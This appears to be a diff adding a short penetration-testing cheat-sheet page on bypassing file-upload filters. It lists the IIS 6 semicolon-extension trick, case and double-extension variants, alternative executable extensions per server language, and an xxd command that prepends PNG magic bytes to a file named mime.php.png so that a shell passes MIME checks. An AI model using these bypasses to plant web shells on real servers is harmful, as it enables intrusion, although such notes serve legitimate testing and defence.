@@ -1,0 +1,24 @@
+<h1 id="upload-bypass">UPLOAD BYPASS:</h1>
+<p>https://www.owasp.org/index.php/Unrestricted_File_Upload<br />
+https://soroush.secproject.com/blog/tag/unrestricted-file-upload/</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IIS 6.0 or below
+Asp &gt; upload as test.txt, copy or move file as test.asp;.txt
+
+Php &gt; upload as pHp / phP / test.php.jpg /
+
+php - phtml, .php, .php3, .php4, .php5,.php7 and .inc
+
+asp - asp, .aspx
+
+perl - .pl, .pm, .cgi, .lib
+
+jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
+
+Coldfusion - .cfm, .cfml, .cfc, .dbm
+</code></pre></div></div>
+
+<h2 id="image-upload">image upload</h2>
+
+<p>As expected, the image gets rejected due to invalid MIME type. The magic bytes for PNG are “89 50 4E 47 0D 0A 1A 0A”, which can be added to the beginning of the shell.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r &gt; mime.php.png
+</code></pre></div></div>
